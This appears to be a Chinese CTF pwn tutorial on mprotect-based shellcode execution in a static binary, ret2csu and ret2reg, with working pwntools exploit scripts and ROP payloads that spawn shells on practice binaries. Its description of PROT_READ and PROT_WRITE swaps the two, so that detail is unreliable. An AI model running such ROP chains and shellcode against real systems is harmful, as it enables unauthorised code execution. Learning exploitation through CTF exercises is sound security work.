### **静态链接****——mprotect

#### **前言：**

现在的大部分程序都会在编译时开启NX保护，这样我们就无法向stack 上写入shellcode从而获得一个shell，但是我们可以使用mprotext修改某个程序的段的权限，从而让这个段具有可执行权限。

#### **mprotect 函数**

在Linux中，mprotect函数的功能是用来设置一块内存的权限

mprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：

```Plain
#include <sys/mman.h>
int mprotect(void *addr, size_t len, int prot);
```

- prot 的取值如下，通过 | 可以将几个属性结合使用（值相加）：
    
    - PROT_READ：可写，值为 1
        
    - PROT_WRITE：可读， 值为 2
        
    - PROT_EXEC：可执行，值为 4
        
    - PROT_NONE：不允许访问，值为 0
        

需要注意的是，指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。

如果执行成功，函数返回 0；如果执行失败，函数返回 -1，并且通过 errno 变量表示具体原因。错误的原因主要有以下几个：

- EACCES：该内存不能设置为相应权限。这是可能发生的，比如 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 修改为 PROT_WRITE。
    
- EINVAL：start 不是一个有效指针，指向的不是某个内存页的开头。
    
- ENOMEM：内核内部的结构体无法分配。
    
- ENOMEM：进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。
    

当一个进程的内存访问行为违背了内存的保护属性，内核将发出 SIGSEGV（Segmentation fault，段错误）信号，并且终止该进程。

#### **mprotect函数的利用**

这个函数利用方式为将目标地址：.got.plt或.bss段 修改为可读可写可执行

#### **下面我将用例题讲解：**

因为是静态链接的，所有的函数都会链接到程序，肯定会存在一个mprotect（）函数

checksec检查一下开启了NX

![[Pasted image 20240918013353.png]]
  

发现有栈溢出
![[Pasted image 20240918013408.png]]
有后门函数
![[Pasted image 20240918013423.png]]
但这一题我们并不用常规方法去做。

题目虽然开了NX保护，但我们可以通过mprotect函数将内存页的权限修改为可读可写可执行

这里需要注意的是指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

所以我们选取的内存起始地址就是4k的整数倍

这里我们选取got表的起始地址（0x080EB000）为mprotect要修改的起始地址addr，将第二个参数len设为0x1000,第三个参数写为7（可读可写可执行）
![[Pasted image 20240918013812.png]]
mprotect的地址是0x0806ed40

  ![[Pasted image 20240918013453.png]]

用mprotect函数修改完权限后，再调用read函数将pwntools生成的shellcode代码注入到addr中，之后再将read函数返回地址写为addr地址，调用shellcode，获得shell

关于mprotect函数传参有点特殊，32位程序调用函数不需要寄存器传参，但是我们需要用ret来控制程序运行流程，

用工具 ROPgadget 随便选一个有三个寄存器加一个ret的gadget

  ![[Pasted image 20240918013510.png]]

这里我就选了：0x08063b9b : pop edi ; pop esi ; pop ebx ; ret

```Python
from pwn import *
context(log_level = 'debug',os = 'linux',endian = 'little',arch = 'i386')
context(terminal=['tnux','split'])
#sh = remote('node5.buuoj.cn',25135)
sh=process('./link')
elf = ELF('./link')
mprotect = 0x806ED40
pop3_ret = 0x0809e3e5
addr = 0x080eb000
read = elf.symbols['read']
shellcode = asm(shellcraft.sh())
payload = flat(['a' * 0x2d,mprotect,pop3_ret,addr,0x100,0x7,read,addr,0,addr,len(shellcode)])
sh.sendline(payload)
sh.sendline(shellcode)
sh.interactive()
```

  

运行获得shell

  

#### **总结**

总结来说就是在存在mprotect函数的情况下，如果出现打开文件之类的操作就可以控制.got.plt表进行内容的读取

payload构建流程：

```JavaScript
垃圾数据 --> mprotect函数地址 --> 三个连续的pop地址 --> .got.plt表起始地址 --> 内存长度 --> 内存权限 --> read函数
 --> read函数的三个参数 --> .got.plt表的起始地址
```

  

### **ret2csu**

##### **什么是ret2csu？**

这个其实就是在程序中一般都会有一段万能的控制参数的gadgets，里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的，因此只要是动态链接的程序就都会有这个函数（至少我还没有遇见过特殊情况）），从而达到控制参数的目的。

#### **下面是__libc_csu_init的汇编代码。**

  

#### **如何利用csu这部分代码？**

这里我们可以利用以下几点

从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。

从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。

从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。

此时开始执行这部分代码，这没什么好说的了，就是把r13,r14,r15的值放入rdx,rsi,edi三个寄存器里面。

然后由于我们前面的rbx是0，加一之后等于了rbp，因此jnz不跳转。那就继续向下执行，如果我们上面call了一个空函数的话，那我们就利用下面的ret。
![[Pasted image 20240918013537.png]]
如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8）个垃圾数据即可。

如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。

##### **下面是这题的演示：**

checksec 开启NX
![[Pasted image 20240918013549.png]]
  
存在着栈溢出
![[Pasted image 20240918013553.png]]
  

这里我们可以看到 rbx，rbp，r12，r13，r14，r15寄存器的其实地址是0x000000000040061A
![[Pasted image 20240918013557.png]]
  

需要的下一个寄存器pop_rdi地址是0x0000000000400623 : pop rdi ; ret

  ![[Pasted image 20240918013601.png]]

下面我们可以构造我们的exp了：

```Plain
from pwn import*
from LibcSearcher import LibcSearcher
p=process('./level5')
elf=ELF('./level5')
write_got=elf.got['write']
pop_5=0x00000000004012aa
#rbx,rbp,r12,r13,r14,r15
pop_rdi=0x00000000004012b3
mov=0x0000000000401290
#rdx<-r12,rsi<-r14,edi<-r15
main=elf.sym['main']
padding= 0x38
payload=flat(b'a'*0x88,p64(pop_5),p64(0),p64(1),p64(write_got),p64(8),p64(write_got),p64(0),p64(mov),p64(b'a'*padding),p64(main))
p.sendline(payload)
recv=u64(p.recv(8))
libc=LibcSearcher('write',recv)
base=recv-libc.dump('write')
sys=base+libc.dump('system')
bin_sh=base+libc.dump('str_bin_sh')
payload=flat(b'a'*0x88,p64(pop_rdi),p64(bin_sh),p64(0xdeadbeef),p64(sys))
p.sendline(payload)
p.interactive()
```

  

### **ret2reg**

##### **原理**

1. 查看栈溢出返回时哪个寄存器指向缓冲区空间。
    
2. 查找对应的call 寄存器或者jmp 寄存器指令，将EIP设置为该指令地址。
    
3. 将寄存器所指向的空间上注入shellcode（确保该空间是可以执行的，通常是栈上的）
    

  

##### **利用思路**

- 分析和调试汇编，查看溢出函数返回时哪个寄存器指向缓冲区地址
    
- 向寄存器指向的缓冲区中注入shellcode
    
- 查找call 该寄存器或者jmp 该寄存器指令，并将该指令地址覆盖ret
    

##### **防御方法**

在函数ret之前，将所有赋过值的[寄存器](https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020)全部复位，清0，以避免此类漏洞

  

#### **Example**

此类漏洞常见于strcpy字符串拷贝函数中。

##### **源程序**

```C
#include <stdio.h>
#include <string.h>
void evilfunction(char *input) {
    char buffer[512];
    strcpy(buffer, input);
}
int main(int argc, char **argv) {
    evilfunction(argv[1]);
    return 0;
}
```

  

##### **checksec +** **IDA****分析**

```C

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

  

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  evilfunction((char *)argv[1]);
  return 0;
}
void __cdecl evilfunction(char *input)
{
  char buffer[512]; // [esp+0h] [ebp-208h]
  strcpy(buffer, input);
}
```

- 可以看出，程序将argv[1]对应的字符串拷贝进了buffer中，argv[1]就是程序接收的命令行参数。
    

```C
./ret2reg 123123
```

  

- 123123就是我们输入的第一个命令行参数，其中 $argv[0] 就是脚本文件名，argc[1]为输入的第一个参数
    
- 返回evilfunction函数的汇编指令
    

```C
.text:0804840B                 push    ebp
.text:0804840C                 mov     ebp, esp
.text:0804840E                 sub     esp, 208h
.text:08048414                 sub     esp, 8
.text:08048417                 push    [ebp+input]     ; src
.text:0804841A                 lea     eax, [ebp+buffer]
.text:08048420                 push    eax             ; dest
.text:08048421                 call    _strcpy
.text:08048426                 add     esp, 10h
.text:08048429                 nop
.text:0804842A                 leave
.text:0804842B                 retn
```

可以看到，lea eax，[ebp+buffer],该指令就是将[ebp + buffer]的偏移地址送给eax，也就相当于eax指向了buffer缓冲区的位置

这时我们就可以向buffer中写入shellcode，并且找到call eax指令地址来覆盖ret，从而拿到shell

这时我们需要查看evilfunction函数返回时，eax是不是还指向缓冲区地址

使用gdb进行调试带参数的程序

```C
gdb --args ret2reg 123123
b *0x0804842B
r
```

  
![[Pasted image 20240918013623.png]]

- 可见eax的值仍为缓冲区的地址
    
- 接下来查找call eax或者jmp eax指令
    

```C
 8048373:        ff d0                        call   *%eax
```

  

payload

```C
payload = shellcode + (0x208 + 4 - len(shellcode)) * a + p32(0x8048373)
```